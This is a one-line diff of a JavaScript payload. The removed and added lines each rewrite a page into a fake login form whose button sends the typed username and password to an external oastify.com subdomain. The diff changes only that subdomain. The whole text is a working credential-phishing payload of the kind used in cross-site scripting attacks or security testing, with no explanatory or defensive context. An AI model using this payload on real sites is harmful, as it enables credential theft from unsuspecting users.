@@ -1,1 +1,1 @@
-document.body.innerHTML=`<input id=u><input id=p type=password><button onclick="(new Image).src='https://kthsr3h897k50gu7qkhcxsov7mdd13ps.oastify.com/?u='+encodeURIComponent(u.value)+'&p='+encodeURIComponent(p.value)">Send</button>`;
+document.body.innerHTML=`<input id=u><input id=p type=password><button onclick="(new Image).src='https://1kmpfzcncgshpo9qk243e8fo3f96xwll.oastify.com/?u='+encodeURIComponent(u.value)+'&p='+encodeURIComponent(p.value)">Send</button>`;
